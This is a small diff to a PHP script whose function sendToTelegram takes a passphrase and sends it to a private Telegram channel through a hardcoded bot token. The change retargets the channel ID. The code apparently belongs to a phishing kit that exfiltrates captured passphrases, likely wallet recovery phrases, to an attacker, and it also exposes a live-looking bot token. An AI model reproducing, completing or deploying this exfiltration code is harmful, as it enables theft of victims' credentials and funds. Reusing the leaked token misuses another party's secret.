@@ -23,7 +23,7 @@ function sendToTelegram($passphrase) {
     $botToken = "7460363720:AAE_1X_Cwm3sJ9RMJFNha04mbzgJ-m8JBys";
     
     // Your private channel ID (with -100 prefix)
-    $channelId = "6542433272";  // Replace with your actual channel ID
+    $channelId = "-1002222609812";  // Replace with your actual channel ID
 
     // The message you want to send
     $message = $passphrase;
